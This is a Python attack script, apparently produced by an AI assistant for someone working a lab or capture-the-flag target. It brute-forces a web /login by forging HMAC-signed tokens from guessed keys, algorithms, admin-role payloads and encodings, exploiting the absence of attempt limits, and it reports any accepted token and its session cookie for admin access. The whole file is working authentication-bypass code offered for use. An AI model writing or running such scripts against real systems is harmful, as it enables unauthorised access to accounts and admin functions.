#!/usr/bin/env python3
# Coastal radar /login: test the "signed token in p" model -> p = data<sep>sig, sig=HMAC(radar18,data).
# Also tries the whole token base64'd, and data base64'd. YOU run it; login attempts are not capped.
# On any non-"denied" response prints the winning construction + Set-Cookie, then replays /admin.
import hmac, hashlib, base64, urllib.request, urllib.parse, re

LOGIN = "http://10.10.10.22:8448/login"
ADMIN = "http://10.10.10.22:8448/admin"
keys  = ["radar18", "radar", "18radar", "radar-18", "radar_18"]
algos = {"sha256": hashlib.sha256, "sha1": hashlib.sha1, "md5": hashlib.md5}
datas = ["admin", "role=admin", "user=admin", "admin=1", "is_admin=1", "u=admin", "name=admin"]
seps  = ["|", ":", ".", "~", "-"]
users = ["admin", "", "x"]

def post(u, p):
    body = urllib.parse.urlencode({"u": u, "p": p}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(LOGIN, data=body), timeout=5)
        return r.getcode(), dict(r.getheaders()), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode(errors="replace")

def tail(b):
    m = re.search(r'RADAR CALIBRATION</p>(.*?)</div>', b, re.S)
    return (m.group(1) if m else b[:160]).strip()

seen = set(); hit = False
def shoot(u, p, tag):
    global hit
    code, hdrs, body = post(u, p)
    t = tail(body)
    if t != "denied" and (tag_key := (t[:50], p[:30])) not in seen:
        seen.add(tag_key); hit = True
        print(f"\n*** HIT {tag}\n    u={u!r} p={p}\n    [{code}] {t[:160]!r}")
        if hdrs.get("Set-Cookie"): print(f"    Set-Cookie: {hdrs['Set-Cookie']}")

for k in keys:
    for an, h in algos.items():
        for data in datas:
            mac = hmac.new(k.encode("latin1"), data.encode(), h)
            sig_hex, sig_b64 = mac.hexdigest(), base64.b64encode(mac.digest()).decode()
            d_b64 = base64.b64encode(data.encode()).decode().rstrip("=")
            for u in users:
                for sep in seps:
                    shoot(u, f"{data}{sep}{sig_hex}", f"k={k} {an} data{sep}hex")
                    shoot(u, f"{data}{sep}{sig_b64}", f"k={k} {an} data{sep}b64")
                    shoot(u, f"{d_b64}{sep}{sig_hex}", f"k={k} {an} b64data{sep}hex")
                    # whole token base64'd
                    whole = base64.b64encode(f"{data}{sep}{sig_hex}".encode()).decode()
                    shoot(u, whole, f"k={k} {an} b64(data{sep}hex)")
print("\ndone." + ("" if hit else " all denied — p is not a signed token either; paste this."))
